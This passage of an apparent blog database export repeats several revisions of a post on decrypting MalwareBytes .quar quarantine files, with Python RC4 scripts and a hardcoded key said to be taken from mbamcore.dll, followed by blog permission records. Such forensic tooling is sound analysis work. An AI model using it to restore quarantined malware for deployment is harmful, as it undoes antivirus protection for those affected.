decrypted_file:\\n\\t\\tdecrypted_file.write(decrypted)\\n\\t\\tdecrypted_file.close()\",\"language\":\"Python\"}],[\"code\",{\"code\":\"import hashlib\\nimport sys, os\\n\\nif len(sys.argv) < 2:\\n    print(\\\"You must include a .quar file to decrypt!\\\")\\n    sys.exit(1)\\n\\ndef rc4_decrypt(sbox, data):\\n    out = bytearray(len(data))\\n    i = 0\\n    j = 0\\n    for k in range(len(data)):\\n        i = (i + 1) % 256\\n        j = (j + sbox[i]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n        val = sbox[(sbox[i] + sbox[j]) % 256]\\n        out[k] = val ^ data[k]\\n\\n    return out\\n\\ndef mbam_ksa():\\n    # hardcoded key obtained from mbamcore.dll\\n    m = hashlib.md5()\\n    m.update(\\\"XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\\\".encode('utf-8'))\\n    key = bytearray(m.digest())\\n    sbox = list(range(256))\\n    j = 0\\n    for i in range(256):\\n        j = (j + sbox[i] + key[i % len(key)]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n\\n    return sbox\\n\\ndef mbam_unquarantine(f):\\n    with open(f, \\\"rb\\\") as quarfile:\\n        data = bytearray(quarfile.read())\\n\\n    sbox = mbam_ksa()\\n    outdata = rc4_decrypt(sbox, data)\\n\\n    return outdata\\n\\ndef main():\\n    MBAMDequarantineFile = mbam_unquarantine(sys.argv[1])\\n    with open( sys.argv[1]+\\\".decrypted2\\\", \\\"wb\\\") as decrypted_file:\\n        decrypted_file.write(MBAMDequarantineFile)\\n        decrypted_file.close()\\n\\nmain()\\n\",\"language\":\"Python\"}]],\"markups\":[[\"a\",[\"href\",\"http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/lib/cuckoo/common/quarantine.py\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/docs/LICENSE\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"MalwareBytes will rename malicious files found during a virus scan to a GUID (e.g. 403dab27-42d6-40e4-8a8b-f4eb4a3ffe82) with a .quar extension. These files are encrypted using RC4 and a long 68 character key.\"]]],[1,\"p\",[[0,[],0,\"To decrypt these files, I looked online to see what was already available. I found \"],[0,[0],1,\"this blog post\"],[0,[],0,\", which included a Perl script to decrypt. Not being a fan of Perl, I decided to roll my own using Python. Below is what I came up with:\"]]],[10,0],[1,\"p\",[[0,[],0,\"This script does have a dependency of the arc4 Python library (pip3 install arc4), but it works and produces files with the same hash as the Perl script on the reference blog post.\"]]],[1,\"p\",[[0,[],0,\"Going a bit deeper into his blog post, he links to a Python file in the Cuckoo sandbox that is capable of decrypting MalwareBytes .quar files, among others. This is great, because we can utilize some of their code as it's already in Python! You can find the original file \"],[0,[1],1,\"here\"],[0,[],0,\" and their GPL license file \"],[0,[2],1,\"here\"],[0,[],0,\". I took snippets of their code, updated them for Python3, and then modified it slightly to work the same as the previous script:\"]]],[10,1],[1,\"p\",[[0,[],0,\"While this script is much longer and does the exact same thing as the one I originally wrote, it does not need the arc4 Python library to run.\"]]]]}","created_at_ts":1568759493907,"created_at":"2019-09-17T22:31:33.000Z"},{"id":"5d815ed1992f0652efb510ac","post_id":"5d815601992f0652efb51051","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"import sys, os\\nfrom arc4 import ARC4\\nimport hashlib\\n\\n\\nif len(sys.argv) < 2:\\n\\tprint(\\\"You must include a .quar file to decrypt!\\\")\\n\\tsys.exit(1)\\n\\nwith open(sys.argv[1], \\\"rb\\\") as encrypted_file:\\n\\tarc4 = ARC4( hashlib.md5('XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb'.encode('utf-8')).digest() )\\n\\tdecrypted = arc4.decrypt(encrypted_file.read())\\n\\twith open( sys.argv[1]+\\\".decrypted\\\", \\\"wb\\\") as decrypted_file:\\n\\t\\tdecrypted_file.write(decrypted)\\n\\t\\tdecrypted_file.close()\",\"language\":\"Python\"}],[\"code\",{\"code\":\"import hashlib\\nimport sys, os\\n\\nif len(sys.argv) < 2:\\n    print(\\\"You must include a .quar file to decrypt!\\\")\\n    sys.exit(1)\\n\\ndef rc4_decrypt(sbox, data):\\n    out = bytearray(len(data))\\n    i = 0\\n    j = 0\\n    for k in range(len(data)):\\n        i = (i + 1) % 256\\n        j = (j + sbox[i]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n        val = sbox[(sbox[i] + sbox[j]) % 256]\\n        out[k] = val ^ data[k]\\n\\n    return out\\n\\ndef mbam_ksa():\\n    # hardcoded key obtained from mbamcore.dll\\n    m = hashlib.md5()\\n    m.update(\\\"XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\\\".encode('utf-8'))\\n    key = bytearray(m.digest())\\n    sbox = list(range(256))\\n    j = 0\\n    for i in range(256):\\n        j = (j + sbox[i] + key[i % len(key)]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n\\n    return sbox\\n\\ndef mbam_unquarantine(f):\\n    with open(f, \\\"rb\\\") as quarfile:\\n        data = bytearray(quarfile.read())\\n\\n    sbox = mbam_ksa()\\n    outdata = rc4_decrypt(sbox, data)\\n\\n    return outdata\\n\\ndef main():\\n    MBAMDequarantineFile = mbam_unquarantine(sys.argv[1])\\n    with open( sys.argv[1]+\\\".decrypted2\\\", \\\"wb\\\") as decrypted_file:\\n        decrypted_file.write(MBAMDequarantineFile)\\n        decrypted_file.close()\\n\\nmain()\\n\",\"language\":\"Python\"}]],\"markups\":[[\"a\",[\"href\",\"http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/lib/cuckoo/common/quarantine.py\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/docs/LICENSE\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"MalwareBytes will rename malicious files found during a virus scan to a GUID (e.g. 403dab27-42d6-40e4-8a8b-f4eb4a3ffe82) with a .quar extension. These files are encrypted using RC4 and a long 68 character key.\"]]],[1,\"p\",[[0,[],0,\"To decrypt these files, I looked online to see what was already available. I found \"],[0,[0],1,\"this blog post\"],[0,[],0,\", which included a Perl script to decrypt. Not being a fan of Perl, I decided to roll my own using Python. Below is what I came up with:\"]]],[10,0],[1,\"p\",[[0,[],0,\"This script does have a dependency of the arc4 Python library (pip3 install arc4), but it works and produces files with the same hash as the Perl script on the reference blog post.\"]]],[1,\"p\",[[0,[],0,\"Going a bit deeper into his blog post, he links to a Python file in the Cuckoo sandbox that is capable of decrypting MalwareBytes .quar files, among others. This is great, because we can utilize some of their code as it's already in Python! You can find the original file \"],[0,[1],1,\"here\"],[0,[],0,\" and their GPL license file \"],[0,[2],1,\"here\"],[0,[],0,\". I took snippets of their code, updated them for Python3, and then modified it slightly to work the same as the previous script:\"]]],[10,1],[1,\"p\",[[0,[],0,\"While this script is much longer and does the exact same thing as the one I originally wrote, it does not need the arc4 Python library to run.\"]]],[1,\"p\",[[0,[],0,\"Enjoy!\"]]]]}","created_at_ts":1568759505716,"created_at":"2019-09-17T22:31:45.000Z"},{"id":"5d815ee1992f0652efb510ae","post_id":"5d815601992f0652efb51051","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"import sys, os\\nfrom arc4 import ARC4\\nimport hashlib\\n\\n\\nif len(sys.argv) < 2:\\n\\tprint(\\\"You must include a .quar file to decrypt!\\\")\\n\\tsys.exit(1)\\n\\nwith open(sys.argv[1], \\\"rb\\\") as encrypted_file:\\n\\tarc4 = ARC4( hashlib.md5('XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb'.encode('utf-8')).digest() )\\n\\tdecrypted = arc4.decrypt(encrypted_file.read())\\n\\twith open( sys.argv[1]+\\\".decrypted\\\", \\\"wb\\\") as decrypted_file:\\n\\t\\tdecrypted_file.write(decrypted)\\n\\t\\tdecrypted_file.close()\",\"language\":\"Python\"}],[\"code\",{\"code\":\"import hashlib\\nimport sys, os\\n\\nif len(sys.argv) < 2:\\n    print(\\\"You must include a .quar file to decrypt!\\\")\\n    sys.exit(1)\\n\\ndef rc4_decrypt(sbox, data):\\n    out = bytearray(len(data))\\n    i = 0\\n    j = 0\\n    for k in range(len(data)):\\n        i = (i + 1) % 256\\n        j = (j + sbox[i]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n        val = sbox[(sbox[i] + sbox[j]) % 256]\\n        out[k] = val ^ data[k]\\n\\n    return out\\n\\ndef mbam_ksa():\\n    # hardcoded key obtained from mbamcore.dll\\n    m = hashlib.md5()\\n    m.update(\\\"XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\\\".encode('utf-8'))\\n    key = bytearray(m.digest())\\n    sbox = list(range(256))\\n    j = 0\\n    for i in range(256):\\n        j = (j + sbox[i] + key[i % len(key)]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n\\n    return sbox\\n\\ndef mbam_unquarantine(f):\\n    with open(f, \\\"rb\\\") as quarfile:\\n        data = bytearray(quarfile.read())\\n\\n    sbox = mbam_ksa()\\n    outdata = rc4_decrypt(sbox, data)\\n\\n    return outdata\\n\\ndef main():\\n    MBAMDequarantineFile = mbam_unquarantine(sys.argv[1])\\n    with open( sys.argv[1]+\\\".decrypted2\\\", \\\"wb\\\") as decrypted_file:\\n        decrypted_file.write(MBAMDequarantineFile)\\n        decrypted_file.close()\\n\\nmain()\\n\",\"language\":\"Python\"}]],\"markups\":[[\"a\",[\"href\",\"http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/lib/cuckoo/common/quarantine.py\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/docs/LICENSE\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"MalwareBytes will rename malicious files found during a virus scan to a GUID (e.g. 403dab27-42d6-40e4-8a8b-f4eb4a3ffe82) with a .quar extension. These files are encrypted using RC4 and a long 68 character key.\"]]],[1,\"p\",[[0,[],0,\"To decrypt these files, I looked online to see what was already available. I found \"],[0,[0],1,\"this blog post\"],[0,[],0,\", which included a Perl script to decrypt. Not being a fan of Perl, I decided to roll my own using Python. Below is what I came up with:\"]]],[10,0],[1,\"p\",[[0,[],0,\"This script does have a dependency of the arc4 Python library (pip3 install arc4), but it works and produces files with the same hash as the Perl script on the reference blog post.\"]]],[1,\"p\",[[0,[],0,\"Going a bit deeper into his blog post, he links to a Python file in the Cuckoo sandbox that is capable of decrypting MalwareBytes .quar files, among others. This is great, because we can utilize some of their code as it's already in Python! You can find the original file \"],[0,[1],1,\"here\"],[0,[],0,\" and their GPL license file \"],[0,[2],1,\"here\"],[0,[],0,\". I took snippets of their code, updated them for Python3, and then modified it slightly to work the same as the previous script:\"]]],[10,1],[1,\"p\",[[0,[],0,\"While this script is much longer and does the exact same thing as the other one, it does not need the arc4 Python library to run.\"]]],[1,\"p\",[[0,[],0,\"Enjoy!\"]]]]}","created_at_ts":1568759521640,"created_at":"2019-09-17T22:32:01.000Z"},{"id":"5d815f2c992f0652efb510b0","post_id":"5d815601992f0652efb51051","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"import sys, os\\nfrom arc4 import ARC4\\nimport hashlib\\n\\n\\nif len(sys.argv) < 2:\\n\\tprint(\\\"You must include a .quar file to decrypt!\\\")\\n\\tsys.exit(1)\\n\\nwith open(sys.argv[1], \\\"rb\\\") as encrypted_file:\\n\\tarc4 = ARC4( hashlib.md5('XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb'.encode('utf-8')).digest() )\\n\\tdecrypted = arc4.decrypt(encrypted_file.read())\\n\\twith open( sys.argv[1]+\\\".decrypted\\\", \\\"wb\\\") as decrypted_file:\\n\\t\\tdecrypted_file.write(decrypted)\\n\\t\\tdecrypted_file.close()\",\"language\":\"Python\"}],[\"code\",{\"code\":\"import hashlib\\nimport sys, os\\n\\nif len(sys.argv) < 2:\\n    print(\\\"You must include a .quar file to decrypt!\\\")\\n    sys.exit(1)\\n\\ndef rc4_decrypt(sbox, data):\\n    out = bytearray(len(data))\\n    i = 0\\n    j = 0\\n    for k in range(len(data)):\\n        i = (i + 1) % 256\\n        j = (j + sbox[i]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n        val = sbox[(sbox[i] + sbox[j]) % 256]\\n        out[k] = val ^ data[k]\\n\\n    return out\\n\\ndef mbam_ksa():\\n    # hardcoded key obtained from mbamcore.dll\\n    m = hashlib.md5()\\n    m.update(\\\"XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\\\".encode('utf-8'))\\n    key = bytearray(m.digest())\\n    sbox = list(range(256))\\n    j = 0\\n    for i in range(256):\\n        j = (j + sbox[i] + key[i % len(key)]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n\\n    return sbox\\n\\ndef mbam_unquarantine(f):\\n    with open(f, \\\"rb\\\") as quarfile:\\n        data = bytearray(quarfile.read())\\n\\n    sbox = mbam_ksa()\\n    outdata = rc4_decrypt(sbox, data)\\n\\n    return outdata\\n\\ndef main():\\n    MBAMDequarantineFile = mbam_unquarantine(sys.argv[1])\\n    with open( sys.argv[1]+\\\".decrypted2\\\", \\\"wb\\\") as decrypted_file:\\n        decrypted_file.write(MBAMDequarantineFile)\\n        decrypted_file.close()\\n\\nmain()\\n\",\"language\":\"Python\"}]],\"markups\":[[\"a\",[\"href\",\"http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/lib/cuckoo/common/quarantine.py\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/docs/LICENSE\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"MalwareBytes will rename malicious files found during a virus scan to a GUID (e.g. 403dab27-42d6-40e4-8a8b-f4eb4a3ffe82) with a .quar extension. These files are encrypted using RC4 and a long 68 character key.\"]]],[1,\"p\",[[0,[],0,\"To decrypt these files, I looked online to see what was already available. I found \"],[0,[0],1,\"this blog post\"],[0,[],0,\", which included a Perl script to decrypt. Not being a fan of Perl, I decided to roll my own using Python. Below is what I came up with:\"]]],[10,0],[1,\"p\",[[0,[],0,\"This script does have a dependency of the arc4 Python library (pip3 install arc4), but it works and produces files with the same hash as the Perl script on the reference blog post.\"]]],[1,\"p\",[[0,[],0,\"The blog post also links to a Python file in the Cuckoo sandbox that is capable of decrypting MalwareBytes .quar files, among others. This is great, because we can utilize some of their code as it's already in Python! You can find the original file \"],[0,[1],1,\"here\"],[0,[],0,\" and their GPL license file \"],[0,[2],1,\"here\"],[0,[],0,\". I took snippets of their code, updated them for Python3, and then modified it slightly to work the same as the previous script:\"]]],[10,1],[1,\"p\",[[0,[],0,\"While this script is much longer and does the exact same thing as the other one, it does not need the arc4 Python library to run.\"]]],[1,\"p\",[[0,[],0,\"Enjoy!\"]]]]}","created_at_ts":1568759596273,"created_at":"2019-09-17T22:33:16.000Z"},{"id":"5d815f3c992f0652efb510b2","post_id":"5d815601992f0652efb51051","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"import sys, os\\nfrom arc4 import ARC4\\nimport hashlib\\n\\n\\nif len(sys.argv) < 2:\\n\\tprint(\\\"You must include a .quar file to decrypt!\\\")\\n\\tsys.exit(1)\\n\\nwith open(sys.argv[1], \\\"rb\\\") as encrypted_file:\\n\\tarc4 = ARC4( hashlib.md5('XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb'.encode('utf-8')).digest() )\\n\\tdecrypted = arc4.decrypt(encrypted_file.read())\\n\\twith open( sys.argv[1]+\\\".decrypted\\\", \\\"wb\\\") as decrypted_file:\\n\\t\\tdecrypted_file.write(decrypted)\\n\\t\\tdecrypted_file.close()\",\"language\":\"Python\"}],[\"code\",{\"code\":\"import hashlib\\nimport sys, os\\n\\nif len(sys.argv) < 2:\\n    print(\\\"You must include a .quar file to decrypt!\\\")\\n    sys.exit(1)\\n\\ndef rc4_decrypt(sbox, data):\\n    out = bytearray(len(data))\\n    i = 0\\n    j = 0\\n    for k in range(len(data)):\\n        i = (i + 1) % 256\\n        j = (j + sbox[i]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n        val = sbox[(sbox[i] + sbox[j]) % 256]\\n        out[k] = val ^ data[k]\\n\\n    return out\\n\\ndef mbam_ksa():\\n    # hardcoded key obtained from mbamcore.dll\\n    m = hashlib.md5()\\n    m.update(\\\"XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\\\".encode('utf-8'))\\n    key = bytearray(m.digest())\\n    sbox = list(range(256))\\n    j = 0\\n    for i in range(256):\\n        j = (j + sbox[i] + key[i % len(key)]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n\\n    return sbox\\n\\ndef mbam_unquarantine(f):\\n    with open(f, \\\"rb\\\") as quarfile:\\n        data = bytearray(quarfile.read())\\n\\n    sbox = mbam_ksa()\\n    outdata = rc4_decrypt(sbox, data)\\n\\n    return outdata\\n\\ndef main():\\n    MBAMDequarantineFile = mbam_unquarantine(sys.argv[1])\\n    with open( sys.argv[1]+\\\".decrypted2\\\", \\\"wb\\\") as decrypted_file:\\n        decrypted_file.write(MBAMDequarantineFile)\\n        decrypted_file.close()\\n\\nmain()\\n\",\"language\":\"Python\"}]],\"markups\":[[\"a\",[\"href\",\"http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/lib/cuckoo/common/quarantine.py\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/docs/LICENSE\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"MalwareBytes will rename malicious files found during a virus scan to a GUID (e.g. 403dab27-42d6-40e4-8a8b-f4eb4a3ffe82) with a .quar extension. These files are encrypted using RC4 and a long 68 character key.\"]]],[1,\"p\",[[0,[],0,\"To decrypt these files, I looked online to see what was already available. I found \"],[0,[0],1,\"this blog post\"],[0,[],0,\", which included a Perl script to decrypt. Not being a fan of Perl, I decided to roll my own using Python. Below is what I came up with:\"]]],[10,0],[1,\"p\",[[0,[],0,\"This script does have a dependency of the arc4 Python library (pip3 install arc4), but it works and produces files with the same hash as the Perl script on the reference blog post.\"]]],[1,\"p\",[[0,[],0,\"The blog post also links to a Python file in the Cuckoo sandbox that is capable of decrypting MalwareBytes .quar files. This is great, because we can utilize some of their code as it's already in Python! You can find the original file \"],[0,[1],1,\"here\"],[0,[],0,\" and their GPL license file \"],[0,[2],1,\"here\"],[0,[],0,\". I took snippets of their code, updated them for Python3, and then modified it slightly to work the same as the previous script:\"]]],[10,1],[1,\"p\",[[0,[],0,\"While this script is much longer and does the exact same thing as the other one, it does not need the arc4 Python library to run.\"]]],[1,\"p\",[[0,[],0,\"Enjoy!\"]]]]}","created_at_ts":1568759612936,"created_at":"2019-09-17T22:33:32.000Z"}],"permissions":[{"id":"5d2754b3992f0652efb50e27","name":"Export database","object_type":"db","action_type":"exportContent","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e28","name":"Import database","object_type":"db","action_type":"importContent","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e29","name":"Delete all content","object_type":"db","action_type":"deleteAllContent","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e2a","name":"Send mail","object_type":"mail","action_type":"send","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e2b","name":"Browse notifications","object_type":"notification","action_type":"browse","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e2c","name":"Add notifications","object_type":"notification","action_type":"add","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e2d","name":"Delete notifications","object_type":"notification","action_type":"destroy","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e2e","name":"Browse posts","object_type":"post","action_type":"browse","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e2f","name":"Read posts","object_type":"post","action_type":"read","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e30","name":"Edit posts","object_type":"post","action_type":"edit","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e31","name":"Add posts","object_type":"post","action_type":"add","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e32","name":"Delete posts","object_type":"post","action_type":"destroy","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e33","name":"Browse settings","object_type":"setting","action_type":"browse","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b3992f0652efb50e34","name":"Read settings","object_type":"setting","action_type":"read","object_id":null,"created_at":"2019-07-11T15:24:35.000Z","updated_at":"2019-07-11T15:24:35.000Z"},{"id":"5d2754b4992f0652efb50e35","name":"Edit settings","object_type":"setting","action_type":"edit","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e36","name":"Generate slugs","object_type":"slug","action_type":"generate","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e37","name":"Browse tags","object_type":"tag","action_type":"browse","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e38","name":"Read tags","object_type":"tag","action_type":"read","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e39","name":"Edit tags","object_type":"tag","action_type":"edit","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e3a","name":"Add tags","object_type":"tag","action_type":"add","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e3b","name":"Delete tags","object_type":"tag","action_type":"destroy","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e3c","name":"Browse themes","object_type":"theme","action_type":"browse","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e3d","name":"Edit themes","object_type":"theme","action_type":"edit","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e3e","name":"Activate themes","object_type":"theme","action_type":"activate","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e3f","name":"Upload themes","object_type":"theme","action_type":"add","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e40","name":"Download themes","object_type":"theme","action_type":"read","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e41","name":"Delete themes","object_type":"theme","action_type":"destroy","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e42","name":"Browse users","object_type":"user","action_type":"browse","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e43","name":"Read users","object_type":"user","action_type":"read","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e44","name":"Edit users","object_type":"user","action_type":"edit","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e45","name":"Add users","object_type":"user","action_type":"add","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e46","name":"Delete users","object_type":"user","action_type":"destroy","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e47","name":"Assign a role","object_type":"role","action_type":"assign","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e48","name":"Browse roles","object_type":"role","action_type":"browse","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e49","name":"Browse clients","object_type":"client","action_type":"browse","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e4a","name":"Read clients","object_type":"client","action_type":"read","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e4b","name":"Edit clients","object_type":"client","action_type":"edit","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e4c","name":"Add clients","object_type":"client","action_type":"add","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e4d","name":"Delete clients","object_type":"client","action_type":"destroy","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e4e","name":"Browse subscribers","object_type":"subscriber","action_type":"browse","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e4f","name":"Read subscribers","object_type":"subscriber","action_type":"read","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e50","name":"Edit subscribers","object_type":"subscriber","action_type":"edit","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e51","name":"Add subscribers","object_type":"subscriber","action_type":"add","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e52","name":"Delete subscribers","object_type":"subscriber","action_type":"destroy","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e53","name":"Browse invites","object_type":"invite","action_type":"browse","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e54","name":"Read invites","object_type":"invite","action_type":"read","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e55","name":"Edit invites","object_type":"invite","action_type":"edit","object_id":null,"created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-07-11T15:24:36.000Z"},{"id":"5d2754b4992f0652efb50e56","name":"Add 